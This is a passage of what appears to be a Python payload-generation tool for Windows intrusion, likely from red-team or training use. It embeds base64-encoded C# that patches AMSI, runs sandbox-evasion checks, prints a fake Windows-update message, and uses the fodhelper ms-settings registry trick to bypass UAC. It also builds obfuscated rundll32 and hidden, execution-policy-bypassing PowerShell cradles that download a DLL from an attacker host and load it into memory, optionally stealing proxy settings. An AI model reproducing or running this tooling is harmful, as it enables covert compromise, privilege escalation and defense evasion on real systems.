        upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGhyZWFkaW5nOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLk5ldDsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIE1pY3Jvc29mdC5XaW4zMjsKCm5hbWVzcGFjZSBDbGFzc0xpYnJhcnkxCnsKICAgIHB1YmxpYyBjbGFzcyBDbGFzczEKICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IE1lc3NhZ2VCb3goSW50UHRyIGhXbmQsIFN0cmluZyB0ZXh0LCBTdHJpbmcgY2FwdGlvbiwgaW50IG9wdGlvbnMpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIExvYWRMaWJyYXJ5KHN0cmluZyBuYW1lKTsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludDMyIGR3U2l6ZSwgVUludDMyIGZsTmV3UHJvdGVjdCwgb3V0IFVJbnQzMiBscGZsT2xkUHJvdGVjdCk7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiLCBFbnRyeVBvaW50ID0gIlJ0bE1vdmVNZW1vcnkiLCBTZXRMYXN0RXJyb3IgPSBmYWxzZSldCiAgICAgICAgc3RhdGljIGV4dGVybiB2b2lkIE1vdmVNZW1vcnkoSW50UHRyIGRlc3QsIEludFB0ciBzcmMsIGludCBzaXplKTsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIHZvaWQgU2xlZXAodWludCBkd01pbGxpc2Vjb25kcyk7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2NFeE51bWEoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgVUludDMyIGZsQWxsb2NhdGlvblR5cGUsIFVJbnQzMiBmbFByb3RlY3QsIFVJbnQzMiBubmRQcmVmZXJyZWQpOwoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q3VycmVudFByb2Nlc3MoKTsKICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgcnVubmVyKCkKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJXaW5kb3dzIHVwZGF0ZSBkb3dubG9hZCBjb21wbGV0ZS4gUHJlcGFyaW5nIHRvIGNvbmZpZ3VyZSBXaW5kb3dzLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKICAgICAgICAgICAgSW50UHRyIG1lbSA9IFZpcnR1YWxBbGxvY0V4TnVtYShHZXRDdXJyZW50UHJvY2VzcygpLCBJbnRQdHIuWmVybywgMHgxMDAwLCAweDMwMDAsIDB4NCwgMCk7CiAgICAgICAgICAgIGlmIChtZW0gPT0gbnVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CgogICAgICAgICAgICBEYXRlVGltZSB0MSA9IERhdGVUaW1lLk5vdzsKICAgICAgICAgICAgU2xlZXAoMTAwMDApOwogICAgICAgICAgICBkb3VibGUgZGVsdGFUID0gRGF0ZVRpbWUuTm93LlN1YnRyYWN0KHQxKS5Ub3RhbFNlY29uZHM7CiAgICAgICAgICAgIGlmIChkZWx0YVQgPCA5LjUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy9hbnRpaGV1cjogY29udGFjdCBmYWtlIHVybCBhbmQgc2VlIGlmIHN0YXR1cyBhY3R1YWxseSByZXR1cm5lZCBvawogICAgICAgICAgICBzdHJpbmcgdXJsID0gImh0dHA6Ly93b2x0cmFtYXBsaGEuY29tIjsKICAgICAgICAgICAgLy9zdHJpbmcgdXJsID0gImh0dHBzOi8vZ29vZ2xlLmNvbSI7IC8vdGVzdAogICAgICAgICAgICAvLyBDcmVhdGVzIGFuIEh0dHBXZWJSZXF1ZXN0IGZvciB0aGUgc3BlY2lmaWVkIFVSTC4KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIEh0dHBXZWJSZXF1ZXN0IG15SHR0cFdlYlJlcXVlc3QgPSAoSHR0cFdlYlJlcXVlc3QpV2ViUmVxdWVzdC5DcmVhdGUodXJsKTsKICAgICAgICAgICAgICAgIC8vIFNlbmRzIHRoZSBIdHRwV2ViUmVxdWVzdCBhbmQgd2FpdHMgZm9yIGEgcmVzcG9uc2UuCiAgICAgICAgICAgICAgICBIdHRwV2ViUmVzcG9uc2UgbXlIdHRwV2ViUmVzcG9uc2UgPSAoSHR0cFdlYlJlc3BvbnNlKW15SHR0cFdlYlJlcXVlc3QuR2V0UmVzcG9uc2UoKTsKICAgICAgICAgICAgICAgIGlmIChteUh0dHBXZWJSZXNwb25zZS5TdGF0dXNDb2RlID09IEh0dHBTdGF0dXNDb2RlLk9LKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vIFJlbGVhc2VzIHRoZSByZXNvdXJjZXMgb2YgdGhlIHJlc3BvbnNlLgogICAgICAgICAgICAgICAgbXlIdHRwV2ViUmVzcG9uc2UuQ2xvc2UoKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiQ29uZmlndXJpbmcgV2luZG93cyB1cGRhdGUuLi4gRG8gbm90IHR1cm4gb2ZmIHlvdXIgY29tcHV0ZXIuIik7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vYW50aWhldXI6IGxvb3AgOTAwIG1pbGxpb24gdGltZXMgYW5kIHNlZSBpZiB0aGUgbG9vcCByZWFsbHkgaGFwcGVuZWQKICAgICAgICAgICAgaW50IGNvdW50ID0gMDsKICAgICAgICAgICAgaW50IG1heCA9IDkwMDAwMDAwMDsKICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBtYXg7IGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgY291bnQrKzsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoY291bnQgIT0gbWF4KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZ29nbygpOwogICAgICAgIH0KCiAgICAgICAgc3RhdGljIHZvaWQgZ29nbygpCiAgICAgICAgewogICAgICAgICAgICAvL3dyZWNrIGFtc2kKICAgICAgICAgICAgc3RyaW5nIG5hbWUxID0gImEiICsgIm1zaSIgKyAiLmRsbCI7CiAgICAgICAgICAgIHN0cmluZyBuYW1lMiA9ICJBIiArICJtc2kiICsgIlNjYW5CIiArICJ1ZmZlciI7CiAgICAgICAgICAgIEludFB0ciBUYXJnZXRETEwgPSBMb2FkTGlicmFyeShuYW1lMSk7CiAgICAgICAgICAgIEludFB0ciBNaW1pUHRyID0gR2V0UHJvY0FkZHJlc3MoVGFyZ2V0RExMLCBuYW1lMik7CiAgICAgICAgICAgIFVJbnQzMiBvbGRQcm90ZWN0ID0gMDsKICAgICAgICAgICAgQnl0ZVtdIGJ1ZmkgPSB7IDB4NDgsIDB4MzEsIDB4QzAgfTsKICAgICAgICAgICAgVmlydHVhbFByb3RlY3QoTWltaVB0ciwgMywgMHg0MCwgb3V0IG9sZFByb3RlY3QpOwogICAgICAgICAgICBNYXJzaGFsLkNvcHkoYnVmaSwgMCwgTWltaVB0ciwgYnVmaS5MZW5ndGgpOwogICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdChNaW1pUHRyLCAzLCAweDIwLCBvdXQgb2xkUHJvdGVjdCk7CgogICAgICAgICAgICAvL3J1bmRsbDMyIFNIRUxMMzIuRExMLFNoZWxsRXhlY19SdW5ETEwgImNtZCIgIi9jIHBeb153XmVecnNeaF5lXmxsLmV4ZSBpZXgoKG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0U3RyaW5nKFtjaGFyW11dQCgxMDQgLCAxMTYgLDExNiAsMTEyICw1OCw0NyAsIDQ3LCA0OSAsNTcsIDUwLCA0Niw0OSwgNTQgLCA1Niw0NiAsNDkgLDUxLDUzICw0NiwgNTUgLDQ3LDExNCwxMTcsIDExMCwgNDYsIDExNiAsIDEyMCAsMTE2KSkpKSI="
        lower = "ICAgICAgICAgICAgc3RyaW5nIGNvbW1hbmQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhkYXRhKTsKCiAgICAgICAgICAgIFJlZ2lzdHJ5S2V5IG5ld2tleSA9IFJlZ2lzdHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXkoQCJTb2Z0d2FyZVxDbGFzc2VzXCIsIHRydWUpOwogICAgICAgICAgICBuZXdrZXkuQ3JlYXRlU3ViS2V5KEAibXMtc2V0dGluZ3NcU2hlbGxcT3Blblxjb21tYW5kIik7CgogICAgICAgICAgICBSZWdpc3RyeUtleSBmb2QgPSBSZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3ViS2V5KEAiU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQiLCB0cnVlKTsKICAgICAgICAgICAgZm9kLlNldFZhbHVlKCJEZWxlZ2F0ZUV4ZWN1dGUiLCAiIik7CiAgICAgICAgICAgIGZvZC5TZXRWYWx1ZSgiIiwgQGNvbW1hbmQpOwogICAgICAgICAgICBmb2QuQ2xvc2UoKTsKCiAgICAgICAgICAgIFByb2Nlc3MgcCA9IG5ldyBQcm9jZXNzKCk7CiAgICAgICAgICAgIHAuU3RhcnRJbmZvLldpbmRvd1N0eWxlID0gUHJvY2Vzc1dpbmRvd1N0eWxlLkhpZGRlbjsKICAgICAgICAgICAgcC5TdGFydEluZm8uRmlsZU5hbWUgPSAiQzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxmb2RoZWxwZXIuZXhlIjsKICAgICAgICAgICAgcC5TdGFydCgpOwoKICAgICAgICAgICAgVGhyZWFkLlNsZWVwKDEwMDAwKTsKCiAgICAgICAgICAgIG5ld2tleS5EZWxldGVTdWJLZXlUcmVlKCJtcy1zZXR0aW5ncyIpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIC8vTWVzc2FnZUJveChJbnRQdHIuWmVybywgY29tbWFuZC5Ub1N0cmluZygpLCAiVGhpcyBpcyBteSBjYXB0aW9uIiwgMCk7CiAgICAgICAgfQogICAgfQp9"
        
        fodfilename = "UACHelper.cs"
        runfilename = "run.txt"

        fcradle,cradle = cradleps1(lhost,runfilename)

        #//rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd" "/c p^o^w^e^rs^h^e^ll.exe iex((new-object net.webclient).downloadstring([System.Text.Encoding]::ASCII.GetString([char[]]@(104 , 116 ,116 ,112 ,58,47 , 47, 49 ,57, 50, 46,49, 54 , 56,46 ,49 ,51,53 ,46, 55 ,47,114,117, 110, 46, 116 , 120 ,116))))"
        target = "http://%s/%s" % (lhost,runfilename)
        target = cradle % target
        #print (target)
        chars = chararray(target)
        chars = ", ".join(chars)

        base = "rundll32 SHELL32.DLL,ShellExec_RunDLL \"cmd\" \"/c p^o^w^e^rs^h^e^ll.exe iex([System.Text.Encoding]::ASCII.GetString([char[]]@(%s)))\""
        base = base % chars
        base_b64 = base64.b64encode(base.encode()).decode()
        #print (base)

        data = "byte[] data = Convert.FromBase64String(\"%s\");" % base_b64

        with open(fodfilename,'w') as f:
            upper = base64.b64decode(upper).decode()
            lower = base64.b64decode(lower).decode()
            f.write(upper + "\n")
            f.write("\t\t\t" + data + "\n")
            f.write(lower)
        f.close()

        print('[+] fodhelper dll cs written: %s' % fodfilename)
        return fodfilename
    pass

def cradledll(lhost,dllfilename):
    loader = "[System.Reflection.Assembly]::Load(%s).GetType(\"ClassLibrary1.Class1\").GetMethod(\"runner\").Invoke(0,$null)"
    cradle = "$wc = (new-object system.net.webclient);"
    if proxy_kill == "1":
        cradle += "$wc.proxy = $null;"
    if custom_agent == "1":
        cradle += "$wc.headers.add('User-Agent','%s');" % agent_string
    if proxy_steal == "1":
        cradle += "New-PSDrive -NAME HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;$keys = gci \'HKU:\\\';ForEach ($key in $keys) {if ($key.Name -like \"*S-1-5-21-*\") {$start = $key.Name.substring(10);break}};$proxyAddr = (Get-ItemProperty -Path \"HKU:$start\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\").ProxyServer;"
        cradle += "[system.net.webrequest]::DefaultWebProxy = new-object system.net.webproxy(\"http://$proxyAddr\");" #note: assuming proxy over http, not https
    dcradle = "$wc.downloaddata('%s')"
    cradle = cradle + loader % dcradle
    target = "http://%s/%s" % (lhost,dllfilename)
    target = cradle % target
    print ('[+] cradle: %s' % target)
    fullcradle = "powershell -Win hidden -nonI -noP -Exe ByPass -ENC %s" % powershell_b64encode(target)
    print ('[+] cradle target: http://%s/%s -> use:\n%s' % (lhost,dllfilename,fullcradle))
    return fullcradle,cradle

def makedll(lhost,lport,bitness,uacbypass):
    if uacbypass == "0":
        gen(lhost,lport,bitness,"csharp")
    if uacbypass == "1":
        runner(lhost,lport,bitness)

    dllcsfilename = writedll(lhost,lport,bitness,uacbypass)
    copy(dllcsfilename,csfilepath,csfilename)
    
    input("[!] build %s%s with bitness %s .. press enter to continue\n" % (csfilepath,csfilename,bitness))
    if bitness == "64":
        copy("%sbin/x64/Release/%s" % (csfilepath,dllfilename),dllwebroot,dllfilename)
    if bitness == "32":
        copy("%sbin/x86/Release/%s" % (csfilepath,dllfilename),dllwebroot,dllfilename)
    cradledll(lhost,dllfilename)
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--uac','-u',required=False,dest='uacbypass',help='uacbypass 0 or 1')
    parser.add_argument('--proxy','-s',required=False,dest='proxy',help='proxy address, e.g. 192.168.135.1:3128')
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    proxy = args.proxy

    uacbypass = args.uacbypass
    if uacbypass != "1": # dll fodhelper 3/26 -defender
        uacbypass = "0"

    makedll(lhost,lport,bitness,uacbypass)